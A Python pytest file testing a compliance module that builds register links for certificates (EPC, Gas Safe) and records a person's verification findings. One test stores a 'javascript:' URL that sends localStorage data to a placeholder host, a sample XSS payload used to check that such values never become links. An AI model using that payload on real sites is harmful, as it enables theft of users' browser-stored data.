"""A person checks a certificate on its register and the platform records what they found."""
from __future__ import annotations

from types import SimpleNamespace
from unittest.mock import AsyncMock, MagicMock
from uuid import uuid4

import pytest

import src.engines.compliance.human_verification as hv

GOVUK = "https://find-energy-certificate.service.gov.uk/find-a-certificate/search-by-reference-number"
GAS = "https://www.gassaferegister.co.uk/find-an-engineer/"


def test_epc_with_a_lodgement_reference_opens_the_certificate_itself():
    link = hv.certificate_verify_link(register_url=GOVUK, certificate_type_code="EPC",
                                      certificate_number="9920-1010-0626-0890-2091")
    assert link["url"].endswith("/energy-certificate/9920-1010-0626-0890-2091")
    assert link["direct"] is True


def test_epc_with_a_synthetic_number_opens_the_search_and_says_why():
    link = hv.certificate_verify_link(register_url=GOVUK, certificate_type_code="EPC",
                                      certificate_number="EPC-SYN-FA96128A")
    assert link["url"] == GOVUK
    assert "20-digit" in link["note"]


def test_a_stored_prefilled_govuk_error_link_is_rebuilt_not_reused():
    link = hv.certificate_verify_link(
        register_url=GOVUK, certificate_type_code="EPC", certificate_number="EPC-SYN-FA96128A",
        stored={"verification_url": GOVUK + "?reference_number=EPC-SYN-FA96128A"})
    assert link["url"] == GOVUK


def test_a_register_that_prefills_gets_the_number():
    link = hv.certificate_verify_link(register_url=GAS, certificate_type_code="CP17",
                                      accreditation_number="123456")
    assert link["url"].startswith(GAS) and "123456" in link["url"]
    assert link["register"] == "Gas Safe registered engineer"


def test_a_type_with_no_register_has_no_link():
    assert hv.certificate_verify_link(register_url=None, certificate_type_code="FIRE_DOOR") is None


def _session_with(cert, items=()):
    session = MagicMock()
    session.get = AsyncMock(return_value=cert)
    result = MagicMock()
    result.scalars.return_value.all.return_value = list(items)
    session.execute = AsyncMock(return_value=result)
    session.commit = AsyncMock()
    return session


@pytest.mark.asyncio
async def test_confirmed_marks_verified_and_closes_the_queue_item(monkeypatch):
    monkeypatch.setattr(hv, "write_audit", AsyncMock())
    cert = SimpleNamespace(id=uuid4(), raw_metadata={"verification": {"status": "needs_human",
                           "verification_url": GAS, "evidence": {"x": 1}}},
                           organization_id=None, org_id=None, updated_at=None, status="Current")
    item = SimpleNamespace(id=uuid4(), status="pending", decided_at=None, decided_by=None, pm_notes=None)
    user = uuid4()
    r = await hv.record_human_verification(_session_with(cert, [item]), cert.id,
                                           outcome="confirmed", checked_by=user)
    v = cert.raw_metadata["verification"]
    assert r["ok"] and r["queue_items_closed"] == 1
    assert v["status"] == "human_verified" and v["verified"] is True and v["channel"] == "human"
    assert v["previous_status"] == "needs_human"
    assert v["evidence"] == {"x": 1}                      # merged, not replaced
    assert v["human_register_url"] == GAS
    assert v["checked_by"] == str(user)
    assert item.status == "approved" and item.decided_by == user
    assert cert.status == "Current"                       # a register check never changes status


@pytest.mark.asyncio
async def test_a_negative_finding_needs_a_note_and_writes_nothing_without_one(monkeypatch):
    monkeypatch.setattr(hv, "write_audit", AsyncMock())
    cert = SimpleNamespace(id=uuid4(), raw_metadata={}, organization_id=None, org_id=None, updated_at=None)
    session = _session_with(cert)
    r = await hv.record_human_verification(session, cert.id, outcome="not_found")
    assert r["ok"] is False and "note" in r["error"]
    assert cert.raw_metadata == {}
    session.commit.assert_not_called()


@pytest.mark.asyncio
async def test_an_unknown_outcome_is_refused():
    r = await hv.record_human_verification(MagicMock(), uuid4(), outcome="probably fine")
    assert r["ok"] is False


def test_a_stored_javascript_url_is_never_a_link():
    evil = {"verification_url": "javascript:fetch('//x/?t='+localStorage.x)"}
    assert hv.certificate_verify_link(register_url=None, certificate_type_code="FIRE_DOOR", stored=evil) is None
    safe = hv.certificate_verify_link(register_url=GAS, certificate_type_code="CP17", stored=evil)
    assert safe["url"].startswith(GAS)


def test_direct_is_about_the_link_built_not_the_number():
    # A 20-digit Gas Safe number is not a GOV.UK page.
    gas = hv.certificate_verify_link(register_url=GAS, certificate_type_code="CP17",
                                     certificate_number="12345678901234567890")
    assert gas["direct"] is False and "GOV.UK" not in gas["note"]
    # Reached through the accreditation number, the GOV.UK page is still the certificate's own.
    epc = hv.certificate_verify_link(register_url=GOVUK, certificate_type_code="EPC",
                                     accreditation_number="9920-1010-0626-0890-2091")
    assert epc["direct"] is True and "own page" in epc["note"]


@pytest.mark.asyncio
async def test_a_negative_finding_closes_its_queue_item_as_rejected_not_approved(monkeypatch):
    monkeypatch.setattr(hv, "write_audit", AsyncMock())
    cert = SimpleNamespace(id=uuid4(), raw_metadata={}, organization_id=None, org_id=None,
                           updated_at=None, status="Current")
    item = SimpleNamespace(id=uuid4(), status="pending", decided_at=None, decided_by=None, pm_notes=None)
    await hv.record_human_verification(_session_with(cert, [item]), cert.id,
                                       outcome="not_found", note="no such firm on BAFE")
    assert item.status == "rejected"
    assert "not_found" in item.pm_notes


@pytest.mark.asyncio
async def test_an_integer_user_id_never_reaches_the_uuid_decided_by_column(monkeypatch):
    # Production's plenum_cafm.users is integer-keyed; decided_by is a uuid column, and an
    # int bound there fails the commit. The id is kept as text in the verification block.
    monkeypatch.setattr(hv, "write_audit", AsyncMock())
    cert = SimpleNamespace(id=uuid4(), raw_metadata={}, organization_id=None, org_id=None,
                           updated_at=None, status="Current")
    item = SimpleNamespace(id=uuid4(), status="pending", decided_at=None, decided_by=None, pm_notes=None)
    await hv.record_human_verification(_session_with(cert, [item]), cert.id, outcome="confirmed", checked_by=42)
    assert item.decided_by is None
    assert item.status == "approved"
    assert cert.raw_metadata["verification"]["checked_by"] == "42"
